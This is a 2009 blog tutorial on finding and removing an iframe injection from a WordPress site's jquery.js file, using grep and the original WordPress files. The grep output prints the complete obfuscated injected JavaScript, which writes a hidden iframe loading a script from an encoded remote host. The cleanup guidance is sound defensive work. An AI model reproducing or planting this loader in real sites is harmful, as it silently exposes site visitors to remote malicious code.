---
title: 'Finding & Removing malicious iframe exploit from WordPress'
author: rahul286
date: 2009-12-07
url: /finding-removing-malicious-iframes-from-wordpress/
views:
  - 129
dsq_thread_id:
  - 2947106032
categories:
  - Tutorial
tags:
  - Exploit
  - Iframe
  - Injection
  - Security
  - Wordpress
  - xblacnknet
---
Sometime back our one under-construction site was infected with iframe injection in its wordpress theme. As it was not live site, I didn&#8217;t care much. Today, my friend Federico&#8217;s company site &#8211; <a href="http://helios-designs.net/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://helios-designs.net/', 'Helios Design']);" >Helios Design</a> was infected with the same exploit.

## First&#8230; About the iframe exploit!

This exploit injected some malicious code into wordpress&#8217;s ***&#8220;wp-includes/js/jquery/jquery.js&#8221;*** file, highlighted in the following screenshot.

<a href="http://www.wpveda.com/files/2009/12/Iframe-injection-in-jquery.js-Wordpress-Security-Issue-1.jpg" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.wpveda.com/files/2009/12/Iframe-injection-in-jquery.js-Wordpress-Security-Issue-1.jpg', '']);" ><img class="alignnone size-large  wp-image-51365" src="http://www.wpveda.com/files/2009/12/Iframe-injection-in-jquery.js-Wordpress-Security-Issue-1-590x345.jpg" alt="Iframe injection in jquery.js - WordPress Security Issue-1" width="590" height="345" /></a>

When compared to original wordpress file &#8211; <a href="http://svn.automattic.com/wordpress/tags/2.8.4/wp-includes/js/jquery/jquery.js" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://svn.automattic.com/wordpress/tags/2.8.4/wp-includes/js/jquery/jquery.js', 'http://svn.automattic.com/wordpress/tags/2.8.4/wp-includes/js/jquery/jquery.js']);" >http://svn.automattic.com/wordpress/tags/2.8.4/wp-includes/js/jquery/jquery.js</a>, you can see some extra code was added at the top.

As a result, at runtime an iframe gets created which was executing a remote script. It also broke sites markup resulting in bad SEO and failed validation. Such exploits can further act as a ground to launch bigger attacks or may infect visitor&#8217;s computer.

If Google visits your site with such codes, your site may get blocked in browsers like Firefox, Chrome and Safari. In those cases, your visitor will get a big security alert when they attempt to visit your site.

## How-To fix this&#8230;

Find the exact codes that are inserted in your theme. In my friend&#8217;s case, following codes were injected:

<a href="http://www.wpveda.com/files/2009/12/iframe-codes-in-theme-2.jpg" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.wpveda.com/files/2009/12/iframe-codes-in-theme-2.jpg', '']);" ><img class="alignnone size-full wp-image-95" src="http://www.wpveda.com/files/2009/12/iframe-codes-in-theme-2.jpg" alt="iframe codes in theme-2" width="588" height="139" /></a>

Now searching for *&#8220;src&#8221;* link wont be good idea. The guy who can inject above codes into wordpress (via third-party codes most probably) will not store its src URL in plain-text. Also, rather than searching for complete code, its better to search different parts.

In this case &#8211; I decided to search *&#8220;uKUwc&#8221;*,  *&#8220;xblacnknet.cn&#8221;* and *&#8220;kDaxV&#8221;* separately.

As far as searching is concerned there are 2 places to search &#8211; database and filesystem.

**For database search you can use** &#8211; phyMyAdmin. If you don&#8217;t have phpMyAdmin, just install <a href="http://wordpress.org/extend/plugins/wp-phpmyadmin/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://wordpress.org/extend/plugins/wp-phpmyadmin/', 'WP-phpMyAdmin plugin']);" >WP-phpMyAdmin plugin</a>.

**To search filesystem** &#8211; open shell to your server and execute ***grep*** command like below:

`grep -H -r "kDaxV" /path/to/wp-root-dir`

Substitute *&#8220;/path/to/wp-root-dir&#8221;* with filesystem path to the directory where wordpress is installed. &#8220;kDaxV&#8221; is a search string. Try different search strings unless u get any result. &#8220;-r&#8221; forces grep to search recursively and &#8220;-H&#8221; make it print filenames. Above command will perform search inside file contents.

For more details on this command <a href="http://www.cyberciti.biz/faq/howto-search-find-file-for-text-string/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.cyberciti.biz/faq/howto-search-find-file-for-text-string/', 'refer this article by Vivek Gite']);" >refer this article by Vivek Gite</a>.

Executing above command resulted in following output:

> ./wp-includes/js/jquery/jquery.js:var/\*\*/YFiXz/\*\*/=/\*\*/document;function/\*\*/ugGMs(czlmZ){/\*\*/var/\*\*/cZdbo/\*\*/=/\*\*/&#8221;&#8221;,/\*\*/aujtC/\*\*/=/\*\*/0;for/\*\*/(aujtC=czlmZ.length-1;aujtC>=0;aujtC&#8211;){cZdbo/\*\*/+=/\*\*/czlmZ.charAt(aujtC);}/\*\*/return/\*\*/cZdbo;}function/\*\*/xHiRm(UbqcV){UbqcV/\*\*/=/\*\*/UbqcV.replace(/[.]/g,/\*\*/&#8221;%&#8221;);UbqcV/\*\*/=/\*\*/unescape(UbqcV);return/\*\*/ugGMs(UbqcV);}function/\*\*/WDxZS(){document.write(&#8220;<style>.kDaxV{width:0%;height:0%;border:none;}</style>&#8221;);var/\*\*/KJKbL/\*\*/=/\*\*/&#8221;<iframe/\*\*/name=&#8221;3&#8243; id=&#8221;uKUwc&#8221; src=&#8221;$&#8221; class=&#8221;kDaxV&#8221;></iframe>&#8221;;var/\*\*/Xqvgy/\*\*/=/\*\*/KJKbL.replace(/[+$]/g,/\*\*/xHiRm(&#8220;.69.67.63.2e.76.2f.76.2f.6e.69.62.2d.69.67.63.2f.6e.63.2e.74.65.6e.6b.63.61.6c.62.78.2f.2f.3a.70.74.74.68&#8243;));return/**/Xqvgy;}YFiXz.writeln(WDxZS());

Once you find exact file, either you can remove malicious codes from it or replace that file with original version form <a href="http://svn.automattic.com/wordpress/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://svn.automattic.com/wordpress/', 'wordpress repo']);" >wordpress repo</a>.

Hope this helps someone out there! <img src="http://devilsworkshop.org/wp-includes/images/smilies/simple-smile.png" alt=":-)" class="wp-smiley" style="height: 1em; max-height: 1em;" />
